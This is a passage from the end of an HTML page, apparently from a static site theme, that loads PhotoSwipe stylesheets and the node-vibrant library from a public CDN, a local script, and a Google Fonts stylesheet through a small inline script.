                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
